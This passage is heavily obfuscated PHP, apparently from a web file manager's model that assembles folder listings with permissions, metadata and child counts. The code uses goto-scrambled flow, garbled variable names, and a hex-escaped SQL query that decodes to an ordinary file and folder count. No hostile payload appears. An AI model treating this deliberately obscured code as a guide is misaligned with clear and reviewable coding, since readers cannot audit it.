$bèè³Ë×Â[28], $bèè³Ë×Â[77] => $bèè³Ë×Â[77], $bèè³Ë×Â[156] => $bèè³Ë×Â[368], $bèè³Ë×Â[374] => $bèè³Ë×Â[374], $bèè³Ë×Â[401] => $bèè³Ë×Â[375], $bèè³Ë×Â[183] => $bèè³Ë×Â[183], $bèè³Ë×Â[106] => $bèè³Ë×Â[106]); $A”Ó»ÎŠ‰‹ = Input::get($bèè³Ë×Â[402], $bèè³Ë×Â[7], $bÕÇË¢ìÍ¿, array_keys($CŞéÚ²)); goto C¯—›ñ””ä; A÷óœ™°½×: $bèè³Ë×Â =& $_SERVER[õëù©û]; $bÕÇË¢ìÍ¿ = Model($bèè³Ë×Â[394])->get($bèè³Ë×Â[395]); $fƒ“Ì¹¤ê = Model($bèè³Ë×Â[394])->get($bèè³Ë×Â[396]); goto Dâ¥’»ÜŒ´; FÊ“Ş†¡‰: } protected function _listDataApplyItem($B·ß¨Ê±¡•, $e“™¥¯İ»¤ = false) { $Dè†—±«¨« = array($B·ß¨Ê±¡•); $this->_listDataApply($Dè†—±«¨«, $e“™¥¯İ»¤); return $Dè†—±«¨«[0]; } protected function _listDataApply(&$f²ŸÙ·Ú , $E™ÀÔÄéÑÈ = false) { goto B¯ö»’¯‚œ; e‘½é›•: $this->_listAppendPath($f²ŸÙ·Ú ); $this->_listAppendAuth($f²ŸÙ·Ú ); $this->_listAppendSourceInfo($f²ŸÙ·Ú , $CĞãµ½­£); goto C ³õÏ‘Â´; B¯ö»’¯‚œ: $E©ŞêÜ§†ì =& $_SERVER[õëù©û]; if (!$f²ŸÙ·Ú ) { $f²ŸÙ·Ú  = array(); return; } $CĞãµ½­£ = array_to_keyvalue($f²ŸÙ·Ú , $E©ŞêÜ§†ì[33], $E©ŞêÜ§†ì[365]); goto c–Š½‚²Ûã; c–Š½‚²Ûã: $CĞãµ½­£ = array_unique($CĞãµ½­£); $this->_listSourceCache($f²ŸÙ·Ú ); if (!$E™ÀÔÄéÑÈ) { $this->_listAppendMeta($f²ŸÙ·Ú , $CĞãµ½­£); $this->_listAppendFileMeta($f²ŸÙ·Ú , $CĞãµ½­£); $this->_listAppendChildren($f²ŸÙ·Ú , $CĞãµ½­£); } goto e‘½é›•; C ³õÏ‘Â´: $this->_listAppendUser($f²ŸÙ·Ú ); $this->_listFilterInfo($f²ŸÙ·Ú , $E™ÀÔÄéÑÈ); goto A›ÛŸÚ¸; A›ÛŸÚ¸: } protected function _listSourceCache($CÇ†°…Õ‡) { $b˜ªÊ¢±¬ =& $_SERVER[õëù©û]; foreach ($CÇ†°…Õ‡ as $Dò‘ù•Æê) { self::$cacheSourceInfo[$b˜ªÊ¢±¬[405] . $Dò‘ù•Æê[$b˜ªÊ¢±¬[365]]] = $Dò‘ù•Æê; } } protected function _listFilterInfo(&$cˆáã¼Ëç¼, $fŠµóÈÚ = false) { $a³‡©ôŸİ­ =& $_SERVER[õëù©û]; foreach ($cˆáã¼Ëç¼ as &$cõ©œ”¤»Ô) { $cõ©œ”¤»Ô = $this->pathInfoFilter($cõ©œ”¤»Ô); self::$cachePathInfo[$a³‡©ôŸİ­[406] . intval($fŠµóÈÚ) . $a³‡©ôŸİ­[407] . $cõ©œ”¤»Ô[$a³‡©ôŸİ­[365]]] = $cõ©œ”¤»Ô; } } protected function _listMake(&$BİÂøÌÙ´Ğ) { $F»Ì‰Úßèñ =& $_SERVER[õëù©û]; $BİÂøÌÙ´Ğ[$F»Ì‰Úßèñ[74]] = array(); $BİÂøÌÙ´Ğ[$F»Ì‰Úßèñ[73]] = array(); foreach ($BİÂøÌÙ´Ğ[$F»Ì‰Úßèñ[350]] as $bğõ„”•ƒ) { $bº…Ï‡Ô¶ = $bğõ„”•ƒ[$F»Ì‰Úßèñ[366]] == 1 ? $F»Ì‰Úßèñ[74] : $F»Ì‰Úßèñ[73]; $BİÂøÌÙ´Ğ[$bº…Ï‡Ô¶][] = $bğõ„”•ƒ; } unset($BİÂøÌÙ´Ğ[$F»Ì‰Úßèñ[350]]); } protected function _listAppendMeta(&$AŒè˜í£ó¡, $eÍôõŞó) { goto eá¡“Û£ñ®; Dã´¯†“á—: if (!$b„·µÍ®†…) { return; } $c¼‡ñ¬ÆŠ˜ = array($bÙéÍëàØ[410], $bÙéÍëàØ[411]); $a”ƒ¯Ïƒİë = array(); goto B£‹‚Êšµ; eá¡“Û£ñ®: $bÙéÍëàØ =& $_SERVER[õëù©û]; $AÙÂÊ¤è‰ = array($bÙéÍëàØ[379] => array($bÙéÍëàØ[380], $eÍôõŞó)); $b„·µÍ®†… = Model($bÙéÍëàØ[408])->field($bÙéÍëàØ[409])->where($AÙÂÊ¤è‰)->select(); goto Dã´¯†“á—; B£‹‚Êšµ: foreach ($b„·µÍ®†… as $d¤è¢Ø¾) { if (!isset($a”ƒ¯Ïƒİë[$d¤è¢Ø¾[$bÙéÍëàØ[365]]])) { $a”ƒ¯Ïƒİë[$d¤è¢Ø¾[$bÙéÍëàØ[365]]] = array(); } if (in_array($d¤è¢Ø¾[$bÙéÍëàØ[89]], $c¼‡ñ¬ÆŠ˜)) { continue; } $a”ƒ¯Ïƒİë[$d¤è¢Ø¾[$bÙéÍëàØ[365]]][$d¤è¢Ø¾[$bÙéÍëàØ[89]]] = $d¤è¢Ø¾[$bÙéÍëàØ[355]]; } foreach ($AŒè˜í£ó¡ as &$aŠÄœ·ƒñˆ) { $aŠÄœ·ƒñˆ[$bÙéÍëàØ[412]] = !1; if (isset($a”ƒ¯Ïƒİë[$aŠÄœ·ƒñˆ[$bÙéÍëàØ[365]]])) { $aŠÄœ·ƒñˆ[$bÙéÍëàØ[412]] = $a”ƒ¯Ïƒİë[$aŠÄœ·ƒñˆ[$bÙéÍëàØ[365]]]; } if ($this->fileIsLock($aŠÄœ·ƒñˆ) && $aŠÄœ·ƒñˆ[$bÙéÍëàØ[372]]) { $C‡ÄàÛà¸µ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $aŠÄœ·ƒñˆ[$bÙéÍëàØ[372]][$bÙéÍëàØ[373]] = AuthModel::authDisable($aŠÄœ·ƒñˆ[$bÙéÍëàØ[372]][$bÙéÍëàØ[373]], $C‡ÄàÛà¸µ); $aŠÄœ·ƒñˆ[$bÙéÍëàØ[372]][$bÙéÍëàØ[413]][$bÙéÍëàØ[372]] = $aŠÄœ·ƒñˆ[$bÙéÍëàØ[372]][$bÙéÍëàØ[373]]; } } goto bƒö‰½êÊå; bƒö‰½êÊå: } protected function _listAppendFileMeta(&$eè“”´†œŒ, $cæÑ•Ö¢ˆ) { goto cŞÂ«ï‰ª; A§õ„Éàä : $e‚ˆĞæğÚİ = $e‚ˆĞæğÚİ ? $e‚ˆĞæğÚİ : array(); $aƒõÎç÷— = array(); foreach ($e‚ˆĞæğÚİ as $D¤’Ë‰ á³) { if (!isset($aƒõÎç÷—[$D¤’Ë‰ á³[$bù¹«•Â¨Š[414]]])) { $aƒõÎç÷—[$D¤’Ë‰ á³[$bù¹«•Â¨Š[414]]] = array(); } $aƒõÎç÷—[$D¤’Ë‰ á³[$bù¹«•Â¨Š[414]]][$D¤’Ë‰ á³[$bù¹«•Â¨Š[89]]] = $D¤’Ë‰ á³[$bù¹«•Â¨Š[355]]; } goto dƒĞ­Ñ¡Ì; cŞÂ«ï‰ª: $bù¹«•Â¨Š =& $_SERVER[õëù©û]; $Aéğ„˜ùğ = array_to_keyvalue($eè“”´†œŒ, $bù¹«•Â¨Š[33], $bù¹«•Â¨Š[414]); $Aéğ„˜ùğ = array_filter(array_unique($Aéğ„˜ùğ)); goto E¦‘ĞÕ‘èº; E¦‘ĞÕ‘èº: if (!$Aéğ„˜ùğ) { return; } $aÒ®È£«ù± = array($bù¹«•Â¨Š[415] => array($bù¹«•Â¨Š[380], $Aéğ„˜ùğ)); $AÔàÌË°ğ× = $bù¹«•Â¨Š[416]; goto bÎ²ÙËô¬; dƒĞ­Ñ¡Ì: foreach ($eè“”´†œŒ as &$b×µµ¢ÜäÑ) { goto Cí©„²—öÂ; bìÃÆÚ¢Öº: if (isset($b×µµ¢ÜäÑ[$bù¹«•Â¨Š[158]][$bù¹«•Â¨Š[421]])) { $b×µµ¢ÜäÑ[$bù¹«•Â¨Š[421]] = json_decode($b×µµ¢ÜäÑ[$bù¹«•Â¨Š[158]][$bù¹«•Â¨Š[421]], !0); unset($b×µµ¢ÜäÑ[$bù¹«•Â¨Š[158]][$bù¹«•Â¨Š[421]]); } goto C«ô±½¾; Cí©„²—öÂ: $a¬´»Œ’³ = $b×µµ¢ÜäÑ[$bù¹«•Â¨Š[414]]; if (!$a¬´»Œ’³ || !isset($F²¦¼’¥×²[$a¬´»Œ’³])) { continue; } $C¯ù“§¿£ = $F²¦¼’¥×²[$a¬´»Œ’³]; goto Dëó«çªœ™; dïÂ¤æÊØ: unset($F²¦¼’¥×²[$a¬´»Œ’³][$bù¹«•Â¨Š[75]]); $D¯£Ó­òÛ‘ = is_array($aƒõÎç÷—[$a¬´»Œ’³]) ? $aƒõÎç÷—[$a¬´»Œ’³] : array(); $b×µµ¢ÜäÑ[$bù¹«•Â¨Š[158]] = array_merge($D¯£Ó­òÛ‘, $F²¦¼’¥×²[$a¬´»Œ’³]); goto bìÃÆÚ¢Öº; Dëó«çªœ™: $C¯ù“§¿£[$bù¹«•Â¨Š[77]] = $b×µµ¢ÜäÑ[$bù¹«•Â¨Š[77]]; $C¯ù“§¿£[$bù¹«•Â¨Š[28]] = $b×µµ¢ÜäÑ[$bù¹«•Â¨Š[28]]; self::$cacheFileInfo[$bù¹«•Â¨Š[420] . $a¬´»Œ’³] = $C¯ù“§¿£; goto dïÂ¤æÊØ; C«ô±½¾: } goto Cõ˜Œ¸†¯¹; bÎ²ÙËô¬: $F²¦¼’¥×² = Model($bù¹«•Â¨Š[417])->field($AÔàÌË°ğ×)->where($aÒ®È£«ù±)->select(); $F²¦¼’¥×² = array_to_keyvalue($F²¦¼’¥×², $bù¹«•Â¨Š[414]); $e‚ˆĞæğÚİ = Model($bù¹«•Â¨Š[418])->field($bù¹«•Â¨Š[419])->where($aÒ®È£«ù±)->select(); goto A§õ„Éàä ; Cõ˜Œ¸†¯¹: } protected function _listAppendSourceInfo(&$cĞ„¾«ôˆ£, $d®ãÁ·öŒ) { goto BÄÓ¹öÃƒ³; d’Ñ»á”áÇ: $A‚âºçõß = Model($dµ˜§œ‘¨[388])->listData(); $AƒÌÈßùÒà = Model($dµ˜§œ‘¨[377])->listData(); $bÁŒ‹áÜ¸± = Model($dµ˜§œ‘¨[424])->listSimple(); goto d•”ÓÔ®’½; cêòˆ„¯ŒÀ: $Aà’–ğšœ¼ = array_to_keyvalue_group($bÁŒ‹áÜ¸±, $dµ˜§œ‘¨[365]); foreach ($cĞ„¾«ôˆ£ as &$aíŞ‘°…¨Ö) { $aíŞ‘°…¨Ö[$dµ˜§œ‘¨[387]] = array($dµ˜§œ‘¨[425] => 0, $dµ˜§œ‘¨[426] => 0, $dµ˜§œ‘¨[427] => 0); if (isset($A™ÑÍŠ—®‡[$aíŞ‘°…¨Ö[$dµ˜§œ‘¨[365]]])) { $aíŞ‘°…¨Ö[$dµ˜§œ‘¨[387]][$dµ˜§œ‘¨[428]] = 1; $aíŞ‘°…¨Ö[$dµ˜§œ‘¨[387]][$dµ˜§œ‘¨[429]] = $A™ÑÍŠ—®‡[$aíŞ‘°…¨Ö[$dµ˜§œ‘¨[365]]][$dµ˜§œ‘¨[28]]; } if (isset($b«Ôòßƒ[$aíŞ‘°…¨Ö[$dµ˜§œ‘¨[365]]])) { $aíŞ‘°…¨Ö[$dµ˜§œ‘¨[387]][$dµ˜§œ‘¨[430]] = array(); foreach ($b«Ôòßƒ[$aíŞ‘°…¨Ö[$dµ˜§œ‘¨[365]]] as $FŸŒ®À¢ëö) { $bë §ï¢ÂÙ = $fÚÙ­¯¡£•[$FŸŒ®À¢ëö]; $aíŞ‘°…¨Ö[$dµ˜§œ‘¨[387]][$dµ˜§œ‘¨[430]][] = array($dµ˜§œ‘¨[431] => $bë §ï¢ÂÙ[$dµ˜§œ‘¨[363]], $dµ˜§œ‘¨[382] => $bë §ï¢ÂÙ[$dµ˜§œ‘¨[28]], $dµ˜§œ‘¨[432] => $bë §ï¢ÂÙ[$dµ˜§œ‘¨[433]]); } } if (isset($Aà’–ğšœ¼[$aíŞ‘°…¨Ö[$dµ˜§œ‘¨[365]]])) { $aíŞ‘°…¨Ö[$dµ˜§œ‘¨[387]][$dµ˜§œ‘¨[434]] = array(); foreach ($Aà’–ğšœ¼[$aíŞ‘°…¨Ö[$dµ˜§œ‘¨[365]]] as $Dñ·Ğğ§‰µ) { $aíŞ‘°…¨Ö[$dµ˜§œ‘¨[387]][$dµ˜§œ‘¨[434]] = array($dµ˜§œ‘¨[435] => $Dñ·Ğğ§‰µ[$dµ˜§œ‘¨[436]], $dµ˜§œ‘¨[437] => $Dñ·Ğğ§‰µ[$dµ˜§œ‘¨[438]], $dµ˜§œ‘¨[439] => $Dñ·Ğğ§‰µ[$dµ˜§œ‘¨[365]], $dµ˜§œ‘¨[440] => $Dñ·Ğğ§‰µ[$dµ˜§œ‘¨[441]], $dµ˜§œ‘¨[442] => $Dñ·Ğğ§‰µ[$dµ˜§œ‘¨[443]]); } } } return $cĞ„¾«ôˆ£; goto dŠ†Îª§÷’; d•”ÓÔ®’½: $fÚÙ­¯¡£• = array_to_keyvalue($FªÎ§ˆƒˆç, $dµ˜§œ‘¨[363]); $b«Ôòßƒ = array_to_keyvalue_group($A‚âºçõß, $dµ˜§œ‘¨[75], $dµ˜§œ‘¨[389]); $A™ÑÍŠ—®‡ = array_to_keyvalue($AƒÌÈßùÒà, $dµ˜§œ‘¨[75]); goto cêòˆ„¯ŒÀ; BÄÓ¹öÃƒ³: $dµ˜§œ‘¨ =& $_SERVER[õëù©û]; if (!defined($dµ˜§œ‘¨[422])) { return; } $FªÎ§ˆƒˆç = Model($dµ˜§œ‘¨[423])->listData(); goto d’Ñ»á”áÇ; dŠ†Îª§÷’: } protected function _listAppendChildren(&$F¸®ÌÕÂŞ¦, $Fª¹•ƒ¥ÏÄ) { goto f™Ä÷£‚”Í; f£ÙÜ¹šƒ: $A­’æ‰è·ù = 1024 * 50; $F¸®ÌÕÂŞ¦ = is_array($F¸®ÌÕÂŞ¦) ? $F¸®ÌÕÂŞ¦ : array(); $F”ÈâÍòæ” = count($F¸®ÌÕÂŞ¦); goto d¼°éµƒå ; f™Ä÷£‚”Í: $a›İïœ²¤ =& $_SERVER[õëù©û]; $c×ğÓ‡¡Ã® = $a›İïœ²¤[357]; $dµëšŠÚß = array(); goto f£ÙÜ¹šƒ; aõ“èÌŞŸ¡: foreach ($F¸®ÌÕÂŞ¦ as &$aÒé½ÒÀÖ) { if ($aÒé½ÒÀÖ[$a›İïœ²¤[366]]) { unset($aÒé½ÒÀÖ[$a›İïœ²¤[368]]); $aÒé½ÒÀÖ[$a›İïœ²¤[188]] = intval($dµëšŠÚß[$aÒé½ÒÀÖ[$a›İïœ²¤[365]] . $a›İïœ²¤[446]][$a›İïœ²¤[447]]); $aÒé½ÒÀÖ[$a›İïœ²¤[187]] = intval($dµëšŠÚß[$aÒé½ÒÀÖ[$a›İïœ²¤[365]] . $a›İïœ²¤[448]][$a›İïœ²¤[447]]); } } goto eöæÈÙĞô¤; d¼°éµƒå : $e—ŸƒßöëÆ = $this->tablePrefix . $this->tableName; for ($Bß¸õñˆ  = 0; $Bß¸õñˆ  < $F”ÈâÍòæ”; $Bß¸õñˆ ++) { $fÅˆ½¸Šµ™ = intval($F¸®ÌÕÂŞ¦[$Bß¸õñˆ ][$a›İïœ²¤[392]]); if ($F¸®ÌÕÂŞ¦[$Bß¸õñˆ ][$a›İïœ²¤[366]]) { $F‹âÒ‰Üø = $F¸®ÌÕÂŞ¦[$Bß¸õñˆ ][$a›İïœ²¤[365]]; $c×ğÓ‡¡Ã® .= "\x53\105\114\105\x43\x54\x20\x2a\40\106\x52\117\115\40\x28\123\x45\114\x45\103\x54\40\47{$F‹âÒ‰Üø}\137\x68\x61\x73\106\151\x6c\145\x27\x20\141\163\40\150\141\163\x2c\x63\157\x75\156\164\x28\61\x29\x20\x61\x73\40\150\141\163\103\x6f\165\x6e\x74\x20\106\122\117\x4d\40\140{$e—ŸƒßöëÆ}\140\x20\xa\x9\x9\11\x9\x9\167\150\x65\162\145\40\160\x61\162\x65\156\164\x49\x44\75{$F‹âÒ‰Üø}\x20\x61\x6e\x64\40\x69\x73\106\157\154\144\x65\162\x3d\x30\x20\x61\x6e\144\x20\x69\163\104\x65\154\x65\164\145\75{$fÅˆ½¸Šµ™}\x29\x20\x61\x73\x20\164\x62\61\x5f{$F‹âÒ‰Üø}\x20\x75\x6e\151\157\x6e\40\x61\154\x6c\40\12\11\x9\11\11\x9\123\105\x4c\x45\x43\x54\40\52\40\x46\122\x4f\115\x20\x28\x53\x45\114\105\x43\x54\x20\x27{$F‹âÒ‰Üø}\137\150\x61\163\106\x6f\154\144\x65\x72\47\x20\141\163\x20\x68\x61\x73\106\x69\154\x65\54\x63\x6f\x75\x6e\x74\50\x31\x29\x20\141\163\40\x68\x61\x73\x43\157\165\x6e\x74\x20\106\x52\117\115\x20\x60{$e—ŸƒßöëÆ}\140\40\xa\x9\11\x9\x9\11\167\150\x65\x72\x65\40\160\x61\x72\x65\x6e\x74\111\104\x3d{$F‹âÒ‰Üø}\x20\x61\156\x64\40\x69\163\106\x6f\x6c\x64\145\x72\75\x31\40\141\156\144\x20\151\163\x44\x65\154\x65\164\x65\x3d{$fÅˆ½¸Šµ™}\51\x20\x61\x73\x20\x74\142\62\x5f{$F‹âÒ‰Üø}\x20\165\156\x69\157\156\x20\x61\x6c\154\x20"; } if ((strlen($c×ğÓ‡¡Ã®) >= $A­’æ‰è·ù || $Bß¸õñˆ  == $F”ÈâÍòæ” - 1) && $c×ğÓ‡¡Ã®) { $c×ğÓ‡¡Ã® = substr($c×ğÓ‡¡Ã®, 0, -strlen($a›İïœ²¤[444])); $a‘æÜà»£¸ = $this->query($c×ğÓ‡¡Ã®); $dµëšŠÚß = array_merge($dµëšŠÚß, $a‘æÜà»£¸); $c×ğÓ‡¡Ã® = $a›İïœ²¤[33]; } } $dµëšŠÚß = array_to_keyvalue($dµëšŠÚß, $a›İïœ²¤[445]); goto aõ“èÌŞŸ¡; eöæÈÙĞô¤: } protected function _listAppendAuth(&$Fµœã±¿ñ–) { goto d°Æ¬·¼’; d÷ÊºŠŠ¢‰: $Fãöˆ¥‚ëñ = Model($B›©¼³ÆñÌ[449])->getSourceList($DíŒ‘çØ¾©, $B‹®ÅÓË‚); foreach ($Fµœã±¿ñ– as $Aï¸èÄºÓĞ => &$d‡»µ–ğ·é) { $d‡»µ–ğ·é[$B›©¼³ÆñÌ[372]] = $Fãöˆ¥‚ëñ[$d‡»µ–ğ·é[$B›©¼³ÆñÌ[365]]]; if (!$d‡»µ–ğ·é[$B›©¼³ÆñÌ[372]] && $d‡»µ–ğ·é[$B›©¼³ÆñÌ[367]] == self::TYPE_GROUP) { $d‡»µ–ğ·é[$B›©¼³ÆñÌ[372]] = Action($B›©¼³ÆñÌ[450])->pathGroupAuthMake($d‡»µ–ğ·é[$B›©¼³ÆñÌ[451]]); if (!$d‡»µ–ğ·é[$B›©¼³ÆñÌ[372]] && !_get($GLOBALS, $B›©¼³ÆñÌ[452])) { $d‡»µ–ğ·é[$B›©¼³ÆñÌ[185]] = !1; $d‡»µ–ğ·é[$B›©¼³ÆñÌ[184]] = !1; } } if ($d‡»µ–ğ·é[$B›©¼³ÆñÌ[372]]) { $d‡»µ–ğ·é[$B›©¼³ÆñÌ[185]] = AuthModel::authCheckEdit($d‡»µ–ğ·é[$B›©¼³ÆñÌ[372]][$B›©¼³ÆñÌ[373]]); $d‡»µ–ğ·é[$B›©¼³ÆñÌ[184]] = AuthModel::authCheckView($d‡»µ–ğ·é[$B›©¼³ÆñÌ[372]][$B›©¼³ÆñÌ[373]]); } $this->groupPathDisplay($d‡»µ–ğ·é); } goto cİ˜Ğíæ‡; d°Æ¬·¼’: $B›©¼³ÆñÌ =& $_SERVER[õëù©û]; if (!defined($B›©¼³ÆñÌ[422])) { return; } $DíŒ‘çØ¾© = array(); goto DäÌó¤”ê; DäÌó¤”ê: foreach ($Fµœã±¿ñ– as $d‡»µ–ğ·é) { if ($d‡»µ–ğ·é[$B›©¼³ÆñÌ[367]] == self::TYPE_GROUP) { $DíŒ‘çØ¾©[] = $d‡»µ–ğ·é[$B›©¼³ÆñÌ[365]]; } } if (!$DíŒ‘çØ¾©) { return; } $B‹®ÅÓË‚ = array_to_keyvalue($Fµœã±¿ñ–, $B›©¼³ÆñÌ[365]); goto d÷ÊºŠŠ¢‰; cİ˜Ğíæ‡: } public function groupPathDisplay(&$CÌ»Õ²ˆéÍ) { goto AŒĞŒÔÏ¼œ; b‰êÓ­š–Ú: $CÌ»Õ²ˆéÍ[$cÃìšïçî‡[455]] = $dİÖƒõÈø‡[$cÃìšïçî‡[456]]; $CÌ»Õ²ˆéÍ[$cÃìšïçî‡[376]] = $dİÖƒõÈø‡[$cÃìšïçî‡[454]]; $CÌ»Õ²ˆéÍ[$cÃìšïçî‡[457]] = $dİÖƒõÈø‡[$cÃìšïçî‡[458]]; goto aÚèÍÀ‹; aÚèÍÀ‹: $CÌ»Õ²ˆéÍ[$cÃìšïçî‡[459]] = $C»»®äºİì . $dİÖƒõÈø‡[$cÃìšïçî‡[387]][$cÃìšïçî‡[365]]; goto aí ¤Ä¤¹Ä; FÖ—ï›¿³: $bæš ·†™¯ = $this->parentLevelArray($dİÖƒõÈø‡[$cÃìšïçî‡[454]]); $C»»®äºİì = $cÃìšïçî‡[33]; foreach ($bæš ·†™¯ as $eŠÅ­´à™È) { $E–°³ª˜‰‡ = Model($cÃìšïçî‡[453])->getInfo($eŠÅ­´à™È); $C»»®äºİì .= $E–°³ª˜‰‡[$cÃìšïçî‡[387]][$cÃìšïçî‡[365]] . $cÃìšïçî‡[47]; } goto b‰êÓ­š–Ú; AŒĞŒÔÏ¼œ: $cÃìšïçî‡ =& $_SERVER[õëù©û]; if ($CÌ»Õ²ˆéÍ[$cÃìšïçî‡[367]] != self::TYPE_GROUP) { return; } $dİÖƒõÈø‡ = Model($cÃìšïçî‡[453])->getInfo($CÌ»Õ²ˆéÍ[$cÃìšïçî‡[451]]); goto FÖ—ï›¿³; aí ¤Ä¤¹Ä: } protected function _listAppendPath(&$f³«‡Öµ‹ğ) { goto cÊƒ‰±Œ²Š; e½ì±ßÇ‚‹: $Cµ¼¥ç›ƒ´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($f³«‡Öµ‹ğ as &$B­£¾ï‹”ù) { goto eÊ‚ê¶½‹ó; d‹¿ÓÓ‚–: if ($bê½½¿•º®) { $cÁå†Â…çä .= $B­£¾ï‹”ù[$d‘Î¾ˆŠ[28]]; } if ($B­£¾ï‹”ù[$d‘Î¾ˆŠ[366]]) { $cÁå†Â…çä .= $d‘Î¾ˆŠ[8]; } $B­£¾ï‹”ù[$d‘Î¾ˆŠ[461]] = str_replace($d‘Î¾ˆŠ[462], $d‘Î¾ˆŠ[8], $cÁå†Â…çä); goto fóƒÔÔøÚ; fóƒÔÔøÚ: $C»®ôµ¯‚î = trim($B­£¾ï‹”ù[$d‘Î¾ˆŠ[461]], $d‘Î¾ˆŠ[8]); if ($B­£¾ï‹”ù[$d‘Î¾ˆŠ[456]] == $d‘Î¾ˆŠ[463] && $C»®ôµ¯‚î) { $B­£¾ï‹”ù[$d‘Î¾ˆŠ[28]] = $C»®ôµ¯‚î; } $this->_listAppendPathRecycle($B­£¾ï‹”ù, $bê½½¿•º®, $Cµ¼¥ç›ƒ´); goto DŠƒİÓÎÅƒ; eÊ‚ê¶½‹ó: $bê½½¿•º® = $this->parentLevelArray($B­£¾ï‹”ù[$d‘Î¾ˆŠ[454]]); $cÁå†Â…çä = $this->_listAppendPathRoot($B­£¾ï‹”ù, $bê½½¿•º®); foreach ($bê½½¿•º® as $c¼Œâªá›—) { if (isset($EÊß´ÄãÒ–[$c¼Œâªá›—])) { $cÁå†Â…çä .= $EÊß´ÄãÒ–[$c¼Œâªá›—] . $d‘Î¾ˆŠ[8]; } } goto d‹¿ÓÓ‚–; DŠƒİÓÎÅƒ: } goto bíø‡ÛË¡ã; bÕ°¡…æÌ: $a‡İ¹’ĞÒ = array(); foreach ($EÊß´ÄãÒ– as $Aç‚ö˜ÎÊŒ => $A©ï³‚Æ–å) { if (!$A©ï³‚Æ–å) { $a‡İ¹’ĞÒ[] = $Aç‚ö˜ÎÊŒ; } } if ($a‡İ¹’ĞÒ) { $e‡ì…„‹ÓÁ = array($d‘Î¾ˆŠ[379] => array($d‘Î¾ˆŠ[380], $a‡İ¹’ĞÒ)); if (count($a‡İ¹’ĞÒ) == 1) { $bêèùªéÆˆ = $this->sourceInfo($a‡İ¹’ĞÒ[0]); $bêèùªéÆˆ = is_array($bêèùªéÆˆ) ? array($bêèùªéÆˆ) : !1; } else { $bêèùªéÆˆ = $this->field($d‘Î¾ˆŠ[460])->where($e‡ì…„‹ÓÁ)->select(); } $EÃ´Æ§ßñ¹ = array_to_keyvalue($bêèùªéÆˆ, $d‘Î¾ˆŠ[365], $d‘Î¾ˆŠ[28]); $EÊß´ÄãÒ– = array_merge_index($EÊß´ÄãÒ–, $EÃ´Æ§ßñ¹); } goto e½ì±ßÇ‚‹; cÊƒ‰±Œ²Š: $d‘Î¾ˆŠ =& $_SERVER[õëù©û]; $EÊß´ÄãÒ– = array(); foreach ($f³«‡Öµ‹ğ as &$B­£¾ï‹”ù) { $EÊß´ÄãÒ–[$B­£¾ï‹”ù[$d‘Î¾ˆŠ[365]]] = $B­£¾ï‹”ù[$d‘Î¾ˆŠ[28]]; $bê½½¿•º® = $this->parentLevelArray($B­£¾ï‹”ù[$d‘Î¾ˆŠ[454]]); array_shift($bê½½¿•º®); foreach ($bê½½¿•º® as $c¼Œâªá›—) { if (!isset($EÊß´ÄãÒ–[$c¼Œâªá›—])) { $EÊß´ÄãÒ–[$c¼Œâªá›—] = 0; } } } goto bÕ°¡…æÌ; bíø‡ÛË¡ã: } private function _listAppendPathRecycle(&$Eù‘íÓÇ¶å, $A¡Ïó‚‡, $a¶‹íó™™) { goto dƒÂøğ; dƒÂøğ: $D•¬Íê…å =& $_SERVER[õëù©û]; if (intval($Eù‘íÓÇ¶å[$D•¬Íê…å[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($a¶‹íó™™, $A¡Ïó‚‡) && $Eù‘íÓÇ¶å[$D•¬Íê…å[365]] != $a¶‹íó™™) { return; } goto EİÉöŠç¸‚; EİÉöŠç¸‚: $eÆõ×´±‘‡ = explode($D•¬Íê…å[8], trim($Eù‘íÓÇ¶å[$D•¬Íê…å[461]], $D•¬Íê…å[8])); $A¡™ÃÅ˜‹‡ = implode($D•¬Íê…å[8], array_slice($eÆõ×´±‘‡, 2)); $Eù‘íÓÇ¶å[$D•¬Íê…å[461]] = $D•¬Íê…å[8] . LNG($D•¬Íê…å[464]) . $D•¬Íê…å[8] . ltrim($A¡™ÃÅ˜‹‡, $D•¬Íê…å[8]); goto eøŸÉáÔİÎ; eøŸÉáÔİÎ: $Eù‘íÓÇ¶å[$D•¬Íê…å[454]] = $D•¬Íê…å[465] . implode($D•¬Íê…å[47], array_slice($A¡Ïó‚‡, 1)) . $D•¬Íê…å[47]; if ($Eù‘íÓÇ¶å[$D•¬Íê…å[365]] == $a¶‹íó™™) { $Eù‘íÓÇ¶å[$D•¬Íê…å[454]] = $D•¬Íê…å[465]; $Eù‘íÓÇ¶å[$D•¬Íê…å[456]] = $D•¬Íê…å[463]; $Eù‘íÓÇ¶å[$D•¬Íê…å[28]] = LNG($D•¬Íê…å[464]); } $Eù‘íÓÇ¶å[$D•¬Íê…å[466]] = $D•¬Íê…å[467]; goto BÄ›ˆÄ…‹†; BÄ›ˆÄ…‹†: } protected function _listAppendPathRoot(&$FŠƒ‘…—ô, $dó ‘¶éíá) { $b­¤çÆò·ó =& $_SERVER[õëù©û]; $F’Ê½ÛÂµÔ = $b­¤çÆò·ó[33]; if ($FŠƒ‘…—ô[$b­¤çÆò·ó[367]] == self::TYPE_USER) { if (defined($b­¤çÆò·ó[422]) && $FŠƒ‘…—ô[$b­¤çÆò·ó[451]] == USER_ID) { $F’Ê½ÛÂµÔ = LNG($b­¤çÆò·ó[468]); if (!$dó ‘¶éíá) { $FŠƒ‘…—ô[$b­¤çÆò·ó[28]] = $F’Ê½ÛÂµÔ; } } else { $d”à¹â‘ = Model($b­¤çÆò·ó[469])->getInfoSimple($FŠƒ‘…—ô[$b­¤çÆò·ó[451]]); $F’Ê½ÛÂµÔ = LNG($b­¤çÆò·ó[470]) . $b­¤çÆò·ó[153] . $d”à¹â‘[$b­¤çÆò·ó[28]] . $b­¤çÆò·ó[471]; } } else { if ($FŠƒ‘…—ô[$b­¤çÆò·ó[367]] == self::TYPE_GROUP) { $d”à¹â‘ = Model($b­¤çÆò·ó[453])->getInfoSimple($FŠƒ‘…—ô[$b­¤çÆò·ó[451]]); $F’Ê½ÛÂµÔ = $d”à¹â‘[$b­¤çÆò·ó[28]]; } else { if ($FŠƒ‘…—ô[$b­¤çÆò·ó[367]] == self::TYPE_SYSTEM) { $d”à¹â‘ = $this->sourceInfo($dó ‘¶éíá[0], !0); $F’Ê½ÛÂµÔ = $d”à¹â‘[$b­¤çÆò·ó[28]]; } } } $F’Ê½ÛÂµÔ = $F’Ê½ÛÂµÔ ? $b­¤çÆò·ó[8] . $F’Ê½ÛÂµÔ . $b­¤çÆò·ó[8] : 